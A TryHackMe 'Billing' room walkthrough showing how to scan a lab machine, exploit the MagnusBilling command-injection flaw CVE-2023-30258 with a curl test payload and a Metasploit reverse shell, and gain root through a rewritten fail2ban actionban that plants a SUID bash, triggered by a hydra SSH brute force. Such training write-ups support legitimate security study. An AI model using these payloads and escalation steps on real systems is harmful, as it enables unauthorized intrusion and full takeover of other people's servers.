## Description

This is a Write-Up for the Room Billing on TryHackMe. The Room can be found [here](https://tryhackme.com/room/billing) and is rated as Easy.

> Gain a shell, find the way and escalate your privileges!

## Scanning

I started this room by scanning the machine with `nmap`.
```sh
sudo nmap -p- -sV -sC -oA nmap/machine -vv 10.10.208.191
```

If we check the results we find three ports open, SSH, an Apache2 server, MYSQL and Asterisk.
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp   open  http     syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
| http-methods:

| http-title:             MagnusBilling        
|_Requested resource was http://10.10.208.191/mbilling/
|_http-server-header: Apache/2.4.56 (Debian)

3306/tcp open  mysql    syn-ack ttl 63 MariaDB (unauthorized)
5038/tcp open  asterisk syn-ack ttl 63 Asterisk Call Manager 2.10.6
```

I next inspected the Web page. You can see that we have a application named MagnusBilling running on the webserver port.

If you google that application name you will find a vulnerability, CVE-2023-30258. You can find out more details by visiting the NIST website. There you will see that it's a unauthenticated RCE.

So for that exploit we don't even need credentials, I next checked if there are any known exploit's available, if you check the [Rapid7 site to this vulerability](https://www.rapid7.com/db/modules/exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258/), you will find out that a Metasploit exploit exists for this vulnerability.

To check if the vulnerability is present on the system, you can test the vulnerable endpoint. The vulnerable endpoint is the `/lib/icepay/icepay.php` file where the `democ` parameter is vulnerable to command injection. The command provided below will wait 6 seconds if the exploit is successful, for that to measure I added a `time` before the curl command to check if the request really takes about 6 seconds.

```terminal
time curl "http://10.10.62.169/mbilling/lib/icepay/icepay.php?democ=/dev/null%3bsleep%206%3b%23"
```

Now the command below takes about 6 seconds so we know the endpoint is vulnerable to command injection. To exploit the vulnerability with Metasploit I used the options provided below. You may notice the options `DisablePayloadHandler` and `AllowNoCleanup`, I used these to disable the auto listener to get a clean shell back. Keep in mind for that to work you need to start a custom listener.

```terminal
nc -lvnp 9001
```

Note: Your interface might vary, you can check it with `ifconfig` or `ip a`.

```terminal
$ msfconsole
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set rhosts 10.10.62.169
rhosts => 10.10.62.169
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set lport 9001
lport => 9001
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set lhost tun0
lhost => tun0
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set AllowNoCleanup true                             
AllowNoCleanup => true
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set payload generic/shell_reverse_tcp
payload => generic/shell_reverse_tcp
msf6 exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
```

This now takes a few seconds and you should get a shell back.

I first executed a shell and checked if the flag is accessable with our current user, this is the case, so with that we solved the user part.

Note: I upgraded my shell before I started searching for the flag. If you'd need more info to that visit this [blog post](https://0xffsec.com/handbook/shells/full-tty/).

```

## Root

I first checked what permissions the current user has in terms of `sudo`:
```terminal
$ sudo -l
Matching Defaults entries for asterisk on Billing:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on Billing:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

The user is able to execute the `fail2ban` binary as root, this executable is used for blocking IP addresses and defining actions when that happens. There is a known privilege escalation technique if we can restart fail2ban and can modify files inside `/etc/fail2ban`, but we can't do that:

```terminal
$ find /etc/fail2ban -writable | wc
      0       0       0
```

Although that doesn't work, we can check the options of the executable and see if we somehow can escalate the privileges with an option, and indeed there is a option. the `-c` option let's you specify a custom path to the fail2ban config folder which is `/etc/fail2ban` by default, so if we copy the structure to `/tmp` modify the file we need and then restart the server with the new config folder, we should get a result.

```
cd /tmp
cp -r /etc/fail2ban/ fail2ban
nano fail2ban/action.d/iptables-multiport.conf
```

Now comment the `actionban` line out and add our custom `actionban`, which will create a bash SUID shell in the `/tmp` folder.
```
# actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = cp /bin/bash /tmp && chmod 4755 /tmp/bash
```

After that you can restart the fail2ban server, but with the new config files.

```
sudo /usr/bin/fail2ban-client -c fail2ban/ restart
```

Finally brute force the server with a few attempts to get the ban action executed. I used hydra for that.
```
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.62.169 -I
```
With that you should be able to find the bash reverse shell in the `/tmp` folder and can execute `/tmp/bash -p` to get the root shell and retrive the flag.

```terminal
$ ./bash -p
bash-5.1# ls
bash  fail2ban  testt.txt
bash-5.1# cd /root
bash-5.1# ls
filename  passwordMysql.log  root.txt
bash-5.1# wc root.txt 
 1  1 38 root.txt
```
